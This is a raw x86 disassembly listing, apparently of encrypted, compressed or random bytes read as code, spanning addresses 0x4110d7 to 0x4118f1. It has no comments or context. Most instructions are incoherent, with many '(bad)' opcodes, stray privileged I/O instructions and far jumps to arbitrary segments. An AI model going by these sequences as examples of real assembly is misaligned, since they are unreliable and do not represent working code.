  4110d7:	pop    ecx
  4110d8:	pop    ds
  4110d9:	or     bl,BYTE PTR [edx-0x6d]
  4110dc:	ficom  DWORD PTR [eax*8-0xbbf2da]
  4110e3:	xchg   esp,eax
  4110e4:	mov    ebp,DWORD PTR [esi+0x62]
  4110e7:	inc    ecx
  4110e8:	push   ebx
  4110e9:	push   0xa5d57723
  4110ee:	cmp    eax,0x24f18ef0
  4110f3:	loop   0x411127
  4110f5:	cmp    ecx,esp
  4110f7:	or     DWORD PTR [esi],0x2c280008
  4110fd:	xchg   ebp,eax
  4110fe:	add    bh,BYTE PTR [edi-0x410a7923]
  411104:	and    eax,0x9869e40c
  411109:	(bad)  
  41110b:	dec    esi
  41110c:	out    dx,eax
  41110d:	sbb    dh,al
  41110f:	pushf  
  411110:	mov    bl,0x60
  411112:	aad    0xf4
  411114:	out    0x8f,eax
  411116:	sub    ah,BYTE PTR [ebx-0x63]
  411119:	inc    ebp
  41111a:	addr16 aad 0x45
  41111d:	enter  0x31a1,0xa0
  411121:	jmp    0x8d56:0xd78959bc
  411128:	jecxz  0x411143
  41112a:	xor    DWORD PTR [edx-0x37],edx
  41112d:	repnz dec ecx
  41112f:	xchg   edi,edi
  411131:	mov    bl,0x8d
  411133:	cmp    bl,BYTE PTR [esi]
  411135:	mov    edi,es
  411137:	sbb    ecx,edx
  411139:	loope  0x41117a
  41113b:	(bad)  
  41113c:	cmp    edi,DWORD PTR [ebp+0x47cf790b]
  411142:	push   ss
  411143:	jmp    0xcbb4a151
  411148:	and    ebx,ecx
  41114a:	mov    ecx,0xbfa1834d
  41114f:	mov    ch,0xb2
  411151:	jne    0x4110f9
  411153:	add    ecx,0x3740cf60
  411159:	inc    edx
  41115a:	mov    ds:0x71498bb6,al
  41115f:	retf   0x9e74
  411162:	xor    dh,ch
  411164:	test   al,0x67
  411166:	xchg   BYTE PTR [edi+0x8],ah
  411169:	pop    ecx
  41116a:	xchg   DWORD PTR [edx],edi
  41116c:	fldcw  WORD PTR [eax+0x23]
  41116f:	mov    ecx,0x9ede7544
  411174:	lods   al,BYTE PTR ds:[esi]
  411175:	or     DWORD PTR [ebp+0x5139c589],ebx
  41117b:	stos   BYTE PTR es:[edi],al
  41117c:	arpl   WORD PTR [edx],ax
  41117e:	sti    
  41117f:	pushf  
  411180:	adc    BYTE PTR ds:0xae1973c3,dh
  411186:	xor    eax,0xdc775891
  41118c:	mov    ebp,esp
  41118e:	call   0xac7a:0x8988c88e
  411195:	mov    edx,DWORD PTR [ecx+ecx*2+0x517f79c4]
  41119c:	addr16 dec edi
  41119e:	and    al,0xd3
  4111a0:	push   edi
  4111a1:	push   ecx
  4111a2:	cmp    al,0xd0
  4111a4:	in     al,0xaa
  4111a6:	loopne 0x411205
  4111a8:	mov    bl,0x9c
  4111aa:	adc    esi,ebp
  4111ac:	cmp    al,0xb1
  4111ae:	pop    edi
  4111af:	(bad)  
  4111b0:	out    dx,eax
  4111b1:	mov    eax,0x22edacc2
  4111b6:	inc    DWORD PTR [ebx+0x29]
  4111b9:	mov    bl,0x5f
  4111bb:	jns    0x41120d
  4111bd:	sbb    esi,DWORD PTR [ebx]
  4111bf:	xchg   BYTE PTR [edx+0x37],ch
  4111c2:	mov    BYTE PTR [ebx+0x5a],al
  4111c5:	mov    dh,BYTE PTR [ebx+0x493cfa23]
  4111cb:	xor    DWORD PTR [edx-0x7ff1afcf],0x22f90c1e
  4111d5:	sahf   
  4111d6:	ret    
  4111d7:	jne    0x4111b0
  4111d9:	retf   0x507
  4111dc:	or     DWORD PTR [edi+0x4da336bd],0xd17fde3f
  4111e6:	xor    ebx,DWORD PTR fs:[ebp-0x7c]
  4111ea:	nop
  4111eb:	repnz mov ah,0x13
  4111ee:	shl    DWORD PTR [ebx],1
  4111f0:	popa   
  4111f1:	js     0x41124e
  4111f3:	loop   0x411217
  4111f5:	mov    esi,0x401f114e
  4111fa:	jns    0x411246
  4111fc:	das    
  4111fd:	inc    esi
  4111fe:	cwde   
  4111ff:	cmp    al,0xb4
  411201:	and    eax,DWORD PTR [ebx-0x3a94c5a3]
  411207:	ins    DWORD PTR es:[edi],dx
  411208:	outs   dx,BYTE PTR ds:[esi]
  411209:	jg     0x41119a
  41120b:	nop
  41120c:	adc    eax,0xad89011c
  411211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411212:	es jne 0x411293
  411215:	das    
  411216:	dec    ebp
  411217:	push   cs
  411218:	pop    ecx
  411219:	idiv   BYTE PTR [ecx+ebx*1+0x29]
  41121d:	pop    ecx
  41121e:	and    ah,cl
  411220:	push   edx
  411221:	inc    ebp
  411222:	(bad)  
  411223:	fimul  DWORD PTR [edx]
  411225:	std    
  411226:	fsubrp st(4),st
  411228:	jmp    DWORD PTR [edx+0x4a9678f4]
  41122e:	mov    edx,DWORD PTR ds:0xb8637463
  411234:	ins    DWORD PTR es:[edi],dx
  411235:	aam    0x61
  411237:	jecxz  0x4112ac
  411239:	mov    eax,ds:0xc3c71fe1
  41123e:	daa    
  41123f:	(bad)  
  411240:	dec    esp
  411241:	push   ds
  411242:	jno    0x411234
  411244:	mov    ebx,0x7f049b2d
  411249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124a:	retf   0xf2d9
  41124d:	fldenv [esi-0x5]
  411250:	clc    
  411251:	cmp    al,0x46
  411253:	cld    
  411254:	js     0x41122f
  411256:	jb     0x41129c
  411258:	popf   
  411259:	adc    al,0xc4
  41125b:	es pop ecx
  41125d:	int3   
  41125e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41125f:	push   esp
  411260:	cmp    esi,ebx
  411262:	pop    esp
  411263:	mov    esp,0xc4fef921
  411268:	sbb    DWORD PTR [edi+0x5965d75c],ecx
  41126e:	ja     0x41120a
  411270:	ss cmc 
  411272:	sub    BYTE PTR [ecx],0x4c
  411275:	mov    dl,0xb7
  411277:	test   BYTE PTR [ecx-0x60],bl
  41127a:	push   esp
  41127b:	sti    
  41127c:	lock inc ebx
  41127e:	in     eax,dx
  41127f:	adc    BYTE PTR [eax+ecx*2-0x4e],dh
  411283:	mov    edx,DWORD PTR [ecx]
  411285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411286:	mov    ecx,0xe47aa8e3
  41128b:	fcomip st,st(6)
  41128d:	scas   al,BYTE PTR es:[edi]
  41128e:	add    DWORD PTR [edx+0x66],esi
  411291:	push   esp
  411292:	(bad)  
  411293:	out    0x11,eax
  411295:	lods   eax,DWORD PTR ds:[esi]
  411297:	into   
  411298:	leave  
  411299:	sub    BYTE PTR [edx+edx*8+0x4e],ah
  41129d:	cmp    DWORD PTR [esi-0x45],esi
  4112a0:	arpl   cx,di
  4112a2:	xlat   BYTE PTR ds:[ebx]
  4112a3:	jb     0x41131f
  4112a5:	pop    ebx
  4112a6:	pop    edx
  4112a7:	mov    dh,BYTE PTR cs:[esi-0x1f24064c]
  4112ae:	jae    0x411319
  4112b0:	push   edx
  4112b1:	jmp    0x3d4a4d34
  4112b6:	(bad)  
  4112b7:	in     al,dx
  4112b8:	xchg   edi,eax
  4112b9:	imul   esi,DWORD PTR [eax+0x48],0x49
  4112bd:	mov    esp,0x65c6f8fa
  4112c2:	xlat   BYTE PTR ds:[ebx]
  4112c3:	and    al,0x58
  4112c5:	inc    esp
  4112c6:	inc    esp
  4112c7:	dec    ecx
  4112c8:	xchg   edi,eax
  4112c9:	sbb    edi,DWORD PTR [esi-0x5f]
  4112cc:	aam    0xa5
  4112ce:	mov    eax,ds:0xdab85d9c
  4112d3:	mov    ebx,eax
  4112d5:	or     dl,ah
  4112d7:	xor    al,0x3f
  4112d9:	add    al,0x32
  4112db:	sbb    edi,DWORD PTR [edi+0x2c]
  4112de:	mov    dh,0xf0
  4112e0:	inc    ebp
  4112e1:	jecxz  0x411277
  4112e3:	push   0xffffffcc
  4112e5:	mov    dh,0xe3
  4112e7:	repnz test al,0x77
  4112ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112eb:	adc    eax,0xe7b32c4c
  4112f0:	push   0xea7df72e
  4112f5:	and    bh,BYTE PTR ds:0xd4ceb60d
  4112fb:	std    
  4112fc:	xor    DWORD PTR [esi-0x6f],edi
  4112ff:	sub    DWORD PTR [eax+0x51ad1c8a],0x8d49d048
  411309:	add    DWORD PTR [edx+0x58b3c7cc],esi
  41130f:	hlt    
  411310:	fdivrp st(5),st
  411312:	cmp    BYTE PTR [ecx],ch
  411314:	pop    edi
  411315:	ja     0x411317
  411317:	dec    edx
  411318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411319:	aad    0xec
  41131b:	mov    ah,0xea
  41131d:	pop    ds
  41131e:	mov    ds:0x19fc9dba,al
  411323:	dec    esp
  411324:	fwait
  411325:	aaa    
  411326:	sbb    ch,al
  411328:	ja     0x41131e
  41132a:	add    DWORD PTR [ecx+0x5f],edx
  41132d:	mov    bl,0xfa
  41132f:	mov    ecx,0x40cfcf83
  411334:	mov    ds:0xf51509d5,al
  411339:	xor    DWORD PTR [ebx+0x5a],eax
  41133c:	jne    0x411398
  41133e:	call   0x91be:0xa2fe465b
  411345:	ins    DWORD PTR es:[edi],dx
  411346:	ret    
  411347:	jno    0x411365
  411349:	jne    0x41136b
  41134b:	out    dx,al
  41134c:	call   0x3f23a219
  411351:	mov    ds:0xb7922c13,eax
  411356:	scas   eax,DWORD PTR es:[edi]
  411357:	or     al,0x1e
  411359:	mov    BYTE PTR gs:[edx+edi*2-0x5fe5cc06],ch
  411361:	push   esi
  411362:	add    eax,0x52ad41c4
  411367:	sub    eax,0x9b72341b
  41136c:	mov    WORD PTR [ebx],gs
  41136e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41136f:	sbb    eax,0xd061a5c1
  411374:	enter  0xdacc,0x5f
  411378:	xor    BYTE PTR [edi-0xb1a0d10],0xf6
  41137f:	jge    0x41130d
  411381:	or     DWORD PTR [edi+edx*2+0xf],edx
  411385:	leave  
  411386:	or     dh,ah
  411388:	stos   DWORD PTR es:[edi],eax
  411389:	(bad)  
  41138a:	xchg   edx,eax
  41138b:	cmp    bh,cl
  41138d:	jo     0x411380
  41138f:	xchg   edx,eax
  411391:	inc    edi
  411392:	jmp    0x9b46:0xd9e2fe22
  411399:	mov    WORD PTR [ebx+0x2c02b98],gs
  41139f:	mov    bh,0x22
  4113a1:	pusha  
  4113a2:	mov    WORD PTR [ebx+0x63535d8],ss
  4113a8:	ja     0x411388
  4113aa:	pop    edx
  4113ab:	shl    BYTE PTR [esi],0x9f
  4113ae:	pusha  
  4113af:	add    al,0x45
  4113b1:	xchg   edx,eax
  4113b2:	ret    0x769e
  4113b5:	shl    BYTE PTR [esi],cl
  4113b7:	push   es
  4113b8:	(bad)  
  4113b9:	es jp  0x41140c
  4113bc:	je     0x411387
  4113be:	mov    DWORD PTR [ebx-0x53],ebp
  4113c1:	in     al,dx
  4113c2:	mov    eax,0x74ee485d
  4113c7:	jl     0x4113ab
  4113c9:	fwait
  4113ca:	lea    ebp,[ebp+0x0]
  4113cd:	(bad)  
  4113ce:	mov    eax,0x33aba15e
  4113d3:	mov    edx,ecx
  4113d5:	hlt    
  4113d6:	jbe    0x411403
  4113d8:	lahf   
  4113d9:	xchg   DWORD PTR [eax-0x46b17d5d],eax
  4113df:	xchg   ecx,eax
  4113e0:	jp     0x4113a0
  4113e2:	aad    0x6f
  4113e4:	sbb    DWORD PTR ds:0x45904281,ecx
  4113ea:	inc    eax
  4113eb:	stos   DWORD PTR es:[edi],eax
  4113ec:	and    al,0x8f
  4113ee:	xchg   BYTE PTR [esi],ch
  4113f0:	pop    edi
  4113f1:	pusha  
  4113f2:	mov    ds:0x45adb5a1,eax
  4113f7:	or     dl,BYTE PTR [ebx]
  4113f9:	sbb    dl,BYTE PTR [eax]
  4113fb:	iret   
  4113fc:	lds    ebx,FWORD PTR [ebx+0x1ad102cf]
  411402:	leave  
  411403:	xor    al,0x80
  411405:	mov    DWORD PTR [esi-0x2760b708],esp
  41140b:	lods   al,BYTE PTR ds:[esi]
  41140c:	test   DWORD PTR [ebp+ebx*8+0x35],0x76abaea7
  411414:	mov    eax,ds:0xa6ed740
  411419:	sbb    ah,BYTE PTR [esi*4-0x747ec109]
  411420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411422:	std    
  411423:	sbb    BYTE PTR [edx],cl
  411425:	xchg   ebx,ecx
  411427:	mov    eax,ds:0xe74e642d
  41142c:	push   DWORD PTR ds:0xcb4917ac
  411432:	xor    eax,0xc0e3fc82
  411437:	mov    esi,ebx
  411439:	dec    ecx
  41143a:	pop    ebx
  41143b:	lods   al,BYTE PTR ds:[esi]
  41143c:	xchg   ebp,eax
  41143d:	es (bad) 
  41143f:	aam    0x9f
  411441:	dec    eax
  411442:	test   eax,0xd0e10337
  411447:	sahf   
  411448:	iret   
  411449:	mov    WORD PTR [ebx-0x1c],ds
  41144c:	mov    ds:0x260be159,eax
  411451:	push   ss
  411452:	xchg   edx,eax
  411453:	sbb    DWORD PTR [edi],ecx
  411455:	in     eax,0xd1
  411457:	xchg   ebp,eax
  411458:	jge    0x4113fd
  41145a:	inc    ah
  41145c:	xor    ch,bl
  41145e:	xor    al,0x9e
  411460:	nop
  411461:	add    dl,BYTE PTR [ebx+0x7f418ae3]
  411467:	cwde   
  411468:	aam    0xa5
  41146a:	jg     0x411422
  41146c:	xchg   edi,eax
  41146d:	fmul   DWORD PTR [esi-0x74]
  411470:	jmp    0x41149e
  411472:	mov    cl,BYTE PTR [esi]
  411474:	pop    edi
  411475:	xchg   ecx,eax
  411476:	enter  0x8a2a,0x1f
  41147a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41147b:	pop    esp
  41147c:	retf   
  41147d:	je     0x41149c
  41147f:	and    al,0x95
  411481:	fs inc ebp
  411483:	sbb    ah,BYTE PTR [ebp-0x6e27c3bd]
  411489:	nop
  41148a:	and    ebp,DWORD PTR [ebp-0x4b71e421]
  411490:	test   al,0x33
  411492:	bound  ecx,QWORD PTR [edx]
  411494:	adc    DWORD PTR [edx+0x3a1a1ceb],ebx
  41149a:	jl     0x4114e4
  41149c:	scas   al,BYTE PTR es:[edi]
  41149d:	lods   eax,DWORD PTR ds:[esi]
  41149e:	(bad)  
  41149f:	idiv   DWORD PTR [eax-0x588cd536]
  4114a5:	mov    ch,0x4b
  4114a7:	sbb    DWORD PTR [ecx+0x4a67bddb],0x1c
  4114ae:	jb     0x4114bb
  4114b0:	imul   esi,DWORD PTR [eax-0x7cccb32e],0xc7942a43
  4114ba:	(bad)  
  4114bb:	xor    al,0xef
  4114bd:	ins    DWORD PTR es:[edi],dx
  4114be:	or     al,0xad
  4114c0:	mov    al,ds:0xb25bef86
  4114c5:	repnz add bl,BYTE PTR [esi-0x300bd438]
  4114cc:	dec    esp
  4114cd:	xlat   BYTE PTR ds:[ebx]
  4114ce:	pop    ds
  4114cf:	mov    edi,0x67e2bee1
  4114d4:	cld    
  4114d5:	add    eax,0xfb598de9
  4114da:	sub    BYTE PTR [eax-0x2cd48044],cl
  4114e0:	(bad)  
  4114e1:	out    0x8b,al
  4114e3:	adc    eax,0x2c811897
  4114e8:	sub    DWORD PTR [ecx],ebp
  4114ea:	aaa    
  4114eb:	adc    DWORD PTR [edx],esp
  4114ed:	out    dx,eax
  4114ee:	lahf   
  4114ef:	sbb    al,0xb3
  4114f1:	std    
  4114f2:	out    dx,eax
  4114f3:	(bad)  
  4114f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114f5:	in     al,0xe6
  4114f7:	push   0x8113bc5e
  4114fc:	cwde   
  4114fd:	test   eax,0x2253d26e
  411502:	push   es
  411503:	bound  ecx,QWORD PTR [ebp+0x26]
  411506:	addr16 sub ebp,eax
  411509:	call   0xc936:0x579b0ded
  411510:	inc    esp
  411511:	inc    edi
  411512:	mov    DWORD PTR [ebx+ebp*2],eax
  411515:	mov    DWORD PTR [esi+0x13],ebp
  411518:	cmp    cl,0x8
  41151b:	jmp    0x86ba:0xceb7b4e4
  411522:	sbb    ecx,DWORD PTR [edx+0x72755e52]
  411528:	and    al,0xaf
  41152a:	mov    esp,DWORD PTR [esp+eax*1+0x6f9e05ba]
  411531:	and    BYTE PTR [edx+0x1e],al
  411534:	daa    
  411535:	scas   eax,DWORD PTR es:[edi]
  411536:	mov    edi,0x7fa1d7dd
  41153b:	sub    al,BYTE PTR [edi]
  41153d:	pop    ebx
  41153e:	pop    ebx
  41153f:	sbb    BYTE PTR [ecx],0xfc
  411542:	fwait
  411543:	mov    BYTE PTR [esi+0x4a65e3e6],dh
  411549:	dec    ecx
  41154a:	lock cs dec esi
  41154d:	sbb    dh,BYTE PTR [ebx+0x5]
  411550:	repnz inc edx
  411552:	addr16 xchg ebp,eax
  411554:	adc    BYTE PTR [ecx],bl
  411556:	js     0x4114e9
  411558:	add    DWORD PTR ds:0x5191a39b,edx
  41155e:	ja     0x4115b2
  411560:	enter  0xf62b,0x2f
  411564:	cs call 0xffcd5d53
  41156a:	call   0xb7e72224
  41156f:	fadd   DWORD PTR [ebp-0x42]
  411572:	(bad)  
  411574:	jo     0x41152a
  411576:	mov    ah,0x24
  411578:	mov    BYTE PTR [edx-0x1e],dl
  41157b:	pop    edi
  41157c:	shl    BYTE PTR [ebx],0x49
  41157f:	imul   eax,edx,0x8492118d
  411585:	jnp    0x4115b7
  411587:	push   esi
  411588:	mov    dl,0x13
  41158a:	dec    eax
  41158b:	dec    esi
  41158c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158d:	out    dx,eax
  41158e:	div    BYTE PTR [eax-0x7b0899eb]
  411594:	sbb    BYTE PTR ds:0x13f07309,cl
  41159a:	adc    cl,0x27
  41159d:	mov    ch,0x50
  41159f:	jg     0x411575
  4115a1:	fldln2 
  4115a3:	test   al,0xce
  4115a5:	sbb    eax,DWORD PTR ds:0x15e10d1a
  4115ab:	pusha  
  4115ac:	es dec edi
  4115ae:	nop
  4115af:	sbb    BYTE PTR [esi-0x16],dh
  4115b2:	retf   
  4115b3:	push   esp
  4115b4:	push   ss
  4115b5:	hlt    
  4115b6:	jg     0x41161c
  4115b8:	pushf  
  4115b9:	int3   
  4115ba:	in     eax,0x72
  4115bc:	mov    esp,0xee12cc63
  4115c1:	xor    eax,0x81876a13
  4115c6:	push   0xffffffb2
  4115c8:	fdiv   QWORD PTR ds:0x63dbb860
  4115ce:	xchg   edx,eax
  4115cf:	jo     0x411622
  4115d1:	scas   al,BYTE PTR es:[edi]
  4115d2:	push   ecx
  4115d3:	fistp  DWORD PTR [ebx+0x22]
  4115d6:	inc    edi
  4115d7:	popa   
  4115d8:	cmp    eax,esp
  4115da:	jnp    0x41164e
  4115dc:	or     al,0xe
  4115de:	inc    edi
  4115df:	(bad)  
  4115e0:	es pop edx
  4115e2:	test   BYTE PTR [esi+0x7b9a80c9],dh
  4115e8:	push   ecx
  4115e9:	jnp    0x411641
  4115eb:	idiv   DWORD PTR [esi+0x1439eb94]
  4115f1:	fist   DWORD PTR [edi-0x31b7d73f]
  4115f7:	loope  0x41164d
  4115f9:	mov    bh,0xea
  4115fb:	sbb    BYTE PTR [ecx+0x7b],dl
  4115fe:	and    BYTE PTR [edx+0x6],ch
  411601:	add    esi,edx
  411603:	mov    ebp,0xa7b85c32
  411608:	rcr    DWORD PTR [edi],1
  41160a:	mov    WORD PTR [edi+0x12d5796b],fs
  411610:	mov    ebp,DWORD PTR [esi-0x624f5921]
  411616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411617:	int    0xed
  411619:	push   ss
  41161a:	repz cmp BYTE PTR [edx-0x218d1cb8],0x9f
  411622:	jnp    0x41161f
  411624:	inc    eax
  411625:	mov    dl,0x81
  411627:	das    
  411628:	xor    al,0x9d
  41162a:	mov    ah,0xf4
  41162c:	rcl    BYTE PTR ds:[edi+0x64],cl
  411630:	jmp    0x4115f2
  411632:	push   0xde06f093
  411637:	cmp    eax,0x77fdd8e6
  41163c:	stc    
  41163d:	loop   0x4116a0
  41163f:	sub    DWORD PTR [ecx-0x692ad300],edi
  411645:	cwde   
  411646:	dec    ecx
  411647:	push   ds
  411648:	pop    ebp
  411649:	sbb    eax,0x63b5cfb0
  41164e:	jg     0x41169f
  411650:	std    
  411651:	cmc    
  411652:	mov    ebx,0x417bb281
  411657:	push   0xcc68990e
  41165c:	je     0x411636
  41165e:	iret   
  41165f:	dec    edx
  411660:	sub    eax,0x467fbfe8
  411665:	jno    0x41165c
  411667:	add    edx,DWORD PTR [ecx]
  411669:	cmp    al,0xbe
  41166b:	hlt    
  41166c:	sub    BYTE PTR [edi+0x16],0x5f
  411670:	jmp    FWORD PTR [ecx]
  411672:	(bad)  [edx-0x5e66e91d]
  411678:	fadd   QWORD PTR [ecx-0x79]
  41167b:	sub    ebp,DWORD PTR [edx+0x2b2c314a]
  411681:	xor    BYTE PTR [esi-0x4370ca1e],ah
  411687:	int3   
  411688:	xor    eax,0xe55d3cf1
  41168d:	jmp    DWORD PTR fs:[edx]
  411690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411691:	sbb    eax,0x6bbd1a18
  411696:	stos   BYTE PTR es:[edi],al
  411697:	mov    DWORD PTR [eax+0x27],edi
  41169a:	jle    0x411684
  41169c:	mov    ds:0x762d316d,eax
  4116a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a2:	test   DWORD PTR [esi+0x30b63223],0x2cfa1ead
  4116ac:	shld   DWORD PTR [ebx+ebx*4],eax,0x94
  4116b1:	cmp    dh,BYTE PTR [ebx]
  4116b3:	lods   al,BYTE PTR ds:[esi]
  4116b4:	and    al,0xd0
  4116b6:	jecxz  0x4116eb
  4116b8:	dec    eax
  4116b9:	jns    0x411695
  4116bb:	push   ds
  4116bc:	fnstsw WORD PTR ds:0x4f881bc8
  4116c2:	test   al,0x1b
  4116c4:	shl    ecx,0x9e
  4116c7:	fs push eax
  4116c9:	call   0xe8d32677
  4116ce:	pusha  
  4116cf:	inc    ecx
  4116d0:	mov    edi,?
  4116d2:	sbb    DWORD PTR [eax+esi*8-0x6a],0xbde9498c
  4116da:	mov    ecx,0x196024f4
  4116df:	push   0xdf1e80e
  4116e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e5:	sbb    eax,0x7c00c196
  4116ea:	ds ins BYTE PTR es:[edi],dx
  4116ec:	out    0xcc,al
  4116ee:	enter  0xdf82,0x94
  4116f2:	adc    eax,DWORD PTR [esp+edx*4]
  4116f5:	xor    BYTE PTR [eax+0x209d48c7],0x52
  4116fc:	and    al,0x2f
  4116fe:	xor    DWORD PTR [edi+0x47],ecx
  411701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411702:	cld    
  411703:	cmp    dh,BYTE PTR ss:[eax+0x54]
  411707:	stc    
  411708:	sub    cl,BYTE PTR [eax-0x4f]
  41170b:	xchg   edi,eax
  41170c:	xchg   ebx,eax
  41170d:	sbb    dl,BYTE PTR [ecx]
  41170f:	inc    eax
  411710:	(bad)  
  411711:	fs jno 0x41173a
  411714:	jmp    0xd793:0x8764b99a
  41171b:	and    al,0xbb
  41171d:	jl     0x41174c
  41171f:	push   es
  411720:	call   0xcf1c7431
  411725:	clc    
  411726:	ins    BYTE PTR es:[edi],dx
  411727:	fcmovnb st,st(2)
  411729:	jo     0x4116ce
  41172b:	or     eax,0x6c716d3c
  411730:	mov    BYTE PTR [edx-0x498c4fc6],ch
  411736:	std    
  411737:	int    0x70
  411739:	retf   
  41173a:	mov    bh,0x2f
  41173c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41173d:	adc    ch,BYTE PTR [edi+edx*1]
  411740:	dec    ecx
  411741:	mov    esi,0xb4f51b76
  411746:	fmul   QWORD PTR [ebp-0x2ff071c3]
  41174c:	lods   al,BYTE PTR ds:[esi]
  41174d:	retf   0xbb2f
  411750:	add    eax,0x121ac1e5
  411755:	push   edi
  411756:	or     ah,BYTE PTR [eax+0x52]
  411759:	retf   0x2454
  41175c:	jl     0x4117bf
  41175e:	jnp    0x411703
  411760:	inc    edi
  411761:	xchg   edx,eax
  411762:	jmp    0x5594:0xa1bb607e
  411769:	xor    DWORD PTR [ebp-0x3],esp
  41176c:	int    0x12
  41176e:	int    0xeb
  411770:	sub    eax,0xb51f0a60
  411775:	lods   eax,DWORD PTR ds:[esi]
  411776:	in     eax,0x48
  411778:	arpl   WORD PTR [esi+0x6947d8ce],dx
  41177e:	stc    
  41177f:	pop    esp
  411780:	sub    DWORD PTR [edx+0x43],ecx
  411783:	test   BYTE PTR [ecx-0x4b],cl
  411786:	sub    al,0x1d
  411788:	jno    0x4117d2
  41178a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41178b:	push   ebx
  41178c:	out    dx,al
  41178d:	add    ebx,DWORD PTR [esi+0x7f]
  411790:	nop
  411791:	daa    
  411792:	pop    ss
  411793:	loop   0x41177f
  411795:	push   cs
  411796:	and    al,0x35
  411798:	jo     0x4117b0
  41179a:	or     ah,BYTE PTR [eax-0x5f]
  41179d:	repz mov bh,0x13
  4117a0:	scas   eax,DWORD PTR es:[edi]
  4117a1:	jmp    0xe90e:0x58f41c2c
  4117a8:	and    dl,BYTE PTR [eax+0x54eb5222]
  4117ae:	std    
  4117af:	mov    ebx,edi
  4117b1:	aam    0x18
  4117b3:	mov    al,ds:0x379480a0
  4117b8:	loope  0x411826
  4117ba:	sub    eax,0x259bb5e1
  4117bf:	cwde   
  4117c0:	xchg   esp,eax
  4117c1:	add    dh,bh
  4117c3:	jo     0x41183d
  4117c5:	int    0x6
  4117c7:	popf   
  4117c8:	and    eax,0x62449c4f
  4117cd:	enter  0xae27,0xc7
  4117d1:	xchg   esp,eax
  4117d2:	cli    
  4117d3:	(bad)  
  4117d5:	jg     0x41176c
  4117d7:	popf   
  4117d8:	dec    ebx
  4117d9:	add    edi,DWORD PTR [edx+0x3e]
  4117dc:	out    dx,al
  4117dd:	or     DWORD PTR [edi],0xc7ad4b8f
  4117e3:	inc    ecx
  4117e4:	js     0x411831
  4117e6:	das    
  4117e7:	jns    0x411802
  4117e9:	adc    BYTE PTR [esi+0x1de68600],ch
  4117ef:	aam    0xd6
  4117f1:	(bad)  [ebx-0x13f1bc40]
  4117f7:	imul   esp,ebx,0x8
  4117fa:	add    edx,DWORD PTR ds:0x6a1a2985
  411800:	stc    
  411801:	into   
  411802:	xor    DWORD PTR ds:[eax+0x7a],eax
  411806:	ss aas 
  411808:	or     eax,0xe3aae5c4
  41180d:	retf   
  41180e:	popf   
  41180f:	inc    ecx
  411810:	icebp  
  411811:	mov    ds:0x1ebe4255,eax
  411816:	jmp    0x2e0e81cd
  41181b:	ja     0x41180a
  41181d:	add    eax,0x115106da
  411822:	xchg   edi,eax
  411823:	test   eax,0xe0193499
  411828:	int3   
  411829:	leave  
  41182a:	cmp    BYTE PTR [ecx],ch
  41182c:	sbb    al,al
  41182e:	sub    esp,ecx
  411830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411831:	cdq    
  411832:	dec    ecx
  411833:	imul   ebp,DWORD PTR [edi],0xffffffd2
  411836:	jl     0x4118a2
  411838:	or     BYTE PTR [ecx+eax*4],bl
  41183b:	push   ss
  41183c:	inc    esi
  41183d:	jge    0x41186b
  41183f:	aas    
  411840:	add    eax,0x9e8ad69b
  411845:	int3   
  411846:	sub    eax,0xb726735f
  41184b:	mov    ah,0xdf
  41184d:	adc    eax,0x1425e657
  411852:	and    BYTE PTR [edx],0xcd
  411855:	cwde   
  411856:	and    BYTE PTR [edi+0x33706631],bl
  41185c:	(bad)  
  41185d:	or     eax,0xd67b713b
  411862:	ja     0x4117fc
  411864:	sbb    DWORD PTR [eax],eax
  411866:	loope  0x4117eb
  411868:	xor    ch,bh
  41186a:	push   ds
  41186b:	sub    al,0xac
  41186d:	sbb    bl,BYTE PTR ds:0x62d5efc7
  411873:	test   BYTE PTR [ebx],al
  411875:	mov    edx,0x8249136d
  41187a:	sub    BYTE PTR [ecx-0x2],ah
  41187d:	pop    ebp
  41187e:	in     al,dx
  41187f:	and    cl,BYTE PTR [ecx-0x46567a58]
  411885:	dec    ebx
  411886:	out    0x3b,eax
  411888:	and    eax,0xdea90dae
  41188d:	leave  
  41188e:	and    dl,BYTE PTR [eax]
  411890:	add    BYTE PTR [esi+0x34b87fd9],0x42
  411897:	adc    eax,0x7501f1cc
  41189c:	test   DWORD PTR [ecx],0x36e1b133
  4118a2:	and    BYTE PTR [esi+0x6c2b0e2],bh
  4118a8:	xchg   esi,eax
  4118a9:	ffree  st(2)
  4118ab:	lock xchg edx,eax
  4118ad:	test   al,0xca
  4118af:	jns    0x4118b7
  4118b1:	jmp    0x411890
  4118b3:	retf   0x7b66
  4118b6:	cmp    eax,0xb0ddbff
  4118bb:	adc    eax,0x59f987ce
  4118c0:	cmp    eax,0x8846c7ba
  4118c5:	add    al,0xa
  4118c7:	ja     0x411873
  4118c9:	and    eax,0x78d0de4
  4118ce:	dec    edi
  4118cf:	push   esp
  4118d0:	fdivp  st(5),st
  4118d2:	inc    esp
  4118d3:	test   eax,0xd0b1d293
  4118d8:	aaa    
  4118d9:	jmp    0x411926
  4118db:	loope  0x4118c5
  4118dd:	stos   BYTE PTR es:[edi],al
  4118de:	mov    esp,0x709cba1a
  4118e3:	mov    dl,0x1b
  4118e5:	adc    cl,ah
  4118e7:	dec    ebx
  4118e8:	hlt    
  4118e9:	out    dx,eax
  4118ea:	sub    edx,ebx
  4118ec:	maxps  xmm3,xmm5
  4118ef:	mov    dl,0xa4
  4118f1:	out    dx,eax
